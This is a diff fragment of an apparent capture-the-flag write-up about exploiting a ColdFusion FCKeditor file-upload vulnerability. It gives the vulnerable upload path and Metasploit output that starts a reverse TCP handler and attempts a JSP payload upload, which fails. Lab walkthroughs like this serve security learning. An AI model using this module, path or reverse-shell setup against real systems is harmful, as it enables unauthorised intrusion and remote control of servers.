@@ -150,3 +150,19 @@ Now i'll try to re-run the exploit and intercept it in burp
 So I will just change the path to the right one which is `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf_upload.cfm` 
 ![image](https://user-images.githubusercontent.com/113513376/213618807-a9c6d0f8-c06a-4961-8a97-e3588e09f0b8.png)
 
+But still it fails 
+
+```
+msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > run
+
+[*] Started reverse TCP handler on 10.10.16.7:4444 
+[*] Uploading the JSP payload at /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/QFSQVIZRMX.jsp...
+[-] Exploit aborted due to failure: unknown: Upload Failed...
+[*] Exploit completed, but no session was created.
+```
+
+Now i checked the request it made in burp suite proxy history
+
+And found the error 
+
+
